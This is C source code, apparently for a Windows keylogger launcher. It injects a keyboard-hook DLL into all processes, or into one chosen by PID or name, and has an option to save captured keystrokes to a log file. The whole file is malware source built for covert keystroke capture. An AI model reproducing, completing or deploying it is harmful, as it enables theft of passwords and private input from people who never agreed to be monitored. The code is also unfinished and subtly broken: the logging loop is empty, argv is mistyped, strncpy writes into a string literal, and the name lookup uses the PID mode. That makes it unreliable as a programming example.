#include "header.h"
#include "getopt.h"
#define KEYBOARD_HOOK_PATH "..\KeyBoardHook.dll" //If you want, change path.
#define KEYBOARD_HOOK_NAME "KeyBoardHook.dll"
#define MAX_FILE_NAME 260

HMODULE dllModule = NULL;
PFN_IS_NEW_KEY_HIT IsNewKeyHit= NULL;
PFN_GET_KEYBOARD_VALUE GetKeyboardValue = NULL;
BOOL opt_filesave = FALSE;
char* log_file_name = "";

DWORD WINAPI GetKeyBoardValueThreadFunc(LPVOID lpParam)
{
	while (1)
	{
		if (IsNewKeyHit)
		{
			if (opt_filesave)
			{

			}
		}
	}
}

int main(int argc, char* argv)
{
	const char* opt_pattern = "as:p:n:";
	int opt = 0;
	DWORD injectedPID=0;
	DWORD *pInjectedPID = &injectedPID;

	if (argc <= 1)
	{
		//if not input option, Just hook all process
		if (!InjectAllProcess(INJECTION_MODE, KEYBOARD_HOOK_PATH))
		{
			printf("Injection Failed!\n");
			exit(-1);
		}
		printf("All Process Hooked");
	}

	while ((opt = getopt(argc, argv, opt_pattern)) != -1)
	{
		switch (opt)
		{
		case 'a':
			if (!InjectAllProcess(INJECTION_MODE, KEYBOARD_HOOK_PATH))
			{
				printf("Injection Failed!\n");
				exit(-1);
			}
			printf("All Process Hookedn\n");
			break;
		case 's': //Save Log(if option argument exist, it's file name)
			opt_filesave = TRUE;
			if (optarg != NULL)
				strncpy(log_file_name, optarg, MAX_FILE_NAME);
			else
				//make log file name
			printf("Save Logging.\n");
			break;
		case 'p'://Hook one process. (option argument: PID) 
			printf("Hook Process PID: %s",optarg);
			if (!SearchProcess(BY_PID, atoi(optarg), NULL, pInjectedPID))
			{
				printf("Can't find process.\n");
				exit(-1);
			}
			InjectDll(injectedPID, KEYBOARD_HOOK_PATH);
			break;
		case 'n'://Hook one process. (option argument: Process name) 
			printf("Hook Process By Name: %s",optarg);
			if (!SearchProcess(BY_PID, 0, optarg, pInjectedPID))
			{
				printf("Can't find process.\n");
				exit(-1);
			}
			InjectDll(injectedPID, KEYBOARD_HOOK_PATH);
			break;
		}
	}

	dllModule = LoadLibrary(KEYBOARD_HOOK_NAME);
	IsNewKeyHit = (PFN_IS_NEW_KEY_HIT)GetProcAddress(dllModule, GET_KEYBOARD_EVENT_FUNC);
	GetKeyboardValue = (PFN_GET_KEYBOARD_VALUE)GetProcAddress(dllModule, GET_KEYBOARD_VALUE_FUNC);
}